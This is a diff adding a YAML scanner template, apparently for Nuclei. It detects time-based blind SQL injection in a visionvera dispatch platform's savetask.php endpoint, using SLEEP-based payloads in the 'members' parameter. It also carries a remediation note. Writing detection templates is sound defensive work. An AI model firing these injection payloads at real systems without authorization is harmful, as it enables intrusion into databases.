@@ -1,0 +1,98 @@
+id: visionvera-zhihuidiaodu-savetask-php-sqli
+
+info:
+  name: visionvera zhihuidiaodu savetask.php SQL注入漏洞
+  author: bl
+  severity: critical
+  tags: 指挥调度管理平台
+  description: |-
+    本模板针对 visionvera zhihuidiaodu 的 savetask.php 端点进行SQL注入检测。攻击者可利用该接口构造恶意参数，干扰后端数据库查询逻辑，进而造成数据泄露或非授权篡改。具体危害程度受目标版本、部署配置及接口暴露范围影响。
+  remediation: >-
+    所有数据库访问均应使用参数化查询或安全的 ORM，按照允许列表校验输入，并为应用配置最小权限的数据库账号。升级到厂商已修复的版本，在完成修复前限制对受影响端点的访问。
+  
+variables:
+  sleepSecond1: '{{rand_int(6, 8)}}'
+  sleepSecond2: '{{rand_int(3, 5)}}'
+
+flow: http(1) && http(2) && http(3)
+
+http:
+  - method: POST
+    path:
+      - '{{BaseURL}}/api/client/task/savetask.php'
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: members=1'and(select*from(SELECT(SELECT(SLEEP(0))))a/**/union/**/select+1)='
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+        internal: true
+      - type: regex
+        regex:
+          - "^\\{\"code"
+        part: body
+        internal: true
+      - type: word
+        words:
+          - "successed"
+        part: body
+        internal: true
+      - type: word
+        words:
+          - "uuid"
+        part: body
+        internal: true
+  - method: POST
+    path:
+      - '{{BaseURL}}/api/client/task/savetask.php'
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: members=1'and(select*from(SELECT(SELECT(SLEEP({{sleepSecond1}}))))a/**/union/**/select+1)='
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "^\\{\"code"
+        part: body
+        internal: true
+      - type: word
+        words:
+          - "successed"
+        part: body
+        internal: true
+      - type: word
+        words:
+          - "uuid"
+        part: body
+        internal: true
+      - type: dsl
+        dsl:
+          - duration - duration_1 >= sleepSecond1 * 1 - 1
+        condition: and
+        internal: true
+  - method: POST
+    path:
+      - '{{BaseURL}}/api/client/task/savetask.php'
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: members=1'and(select*from(SELECT(SELECT(SLEEP({{sleepSecond2}}))))a/**/union/**/select+1)='
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "^\\{\"code"
+        part: body
+      - type: word
+        words:
+          - "successed"
+        part: body
+      - type: word
+        words:
+          - "uuid"
+        part: body
+      - type: dsl
+        dsl:
+          - duration - duration_1 >= sleepSecond2 * 1 - 1
+        condition: and
